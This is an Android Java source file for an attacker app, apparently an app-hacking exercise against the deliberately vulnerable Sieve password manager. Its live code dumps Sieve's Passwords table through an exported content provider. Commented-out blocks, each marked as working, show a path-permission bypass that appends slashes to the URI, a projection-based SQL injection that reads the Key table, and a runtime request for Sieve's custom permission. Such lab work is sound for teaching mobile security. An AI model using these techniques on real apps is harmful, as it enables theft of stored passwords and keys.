package com.apphacking.sievebackup;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.widget.TextView;

import java.sql.Blob;

public class MainActivity extends AppCompatActivity {

    TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.textView);


        /**
         * Query the Passwords table
         * Verified it is working!
         *
        Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
        Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);

        textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
        */

        /**
         * Query the Passwords table
         * Verified it is working!
         */


         Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");
         Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);

         int index;
         byte[] passwordBlob = {0};

         // Checking if we are having entries in our Passwords table.
         if(queryCursor != null && queryCursor.getCount() > 0) {

             if(queryCursor.moveToFirst()) {
                 index = queryCursor.getColumnIndexOrThrow("password");

                 if(index >= 0) {
                     passwordBlob = queryCursor.getBlob(index);
                     //System.out.println(Base64.encodeToString(passwordBlob,0));
                 }
             }
         }

         String output = DatabaseUtils.dumpCursorToString(queryCursor);
         output += "\npassword encoded = " + Base64.encodeToString(passwordBlob,0);

         textView.setText(output);



        /**
         * First attempt
         * Bypassing the custom user permission, because of the missing regex regarding to the PATH
         * Simply appending ///// at the end of our content URI will bypass it.
         * It works!

        Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys/////");
        Cursor queryCursor = getContentResolver().query(uri,null,null,null,null);

        textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
         */

        /**
         * Second attempt
         * SQL Injection
         * We need to query the Passwords table to insert our own SQL statement
         * SQL statement will be inserted via the projection
         * SQL syntax is sth like: SELECT * FROM Passwords WHERE ....
         * projection --> SELECT '* FROM Key--;' (ignored .... FROM Passwords WHERE)
         * Works!
         *
        Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords");

        String[] projection = new String[] {"* FROM KEY--;"};
        Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);

        textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
        */


        /**
         * Third attempt
         * Granting the custom permissions of the sieve application to query the Key table.
         * consider:
         *  - Define them in the Manifest
         *  - We need to ask for them during runtime.
         *
        String[] permission = new String[] {"com.mwr.example.sieve.READ_KEYS"};
        ActivityCompat.requestPermissions(this, permission,9001);

        Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys");

        String[] projection = new String[] {"*"};
        Cursor queryCursor = getContentResolver().query(uri,projection,null,null,null);

        textView.setText("cursor " + DatabaseUtils.dumpCursorToString(queryCursor));
        */

    }
}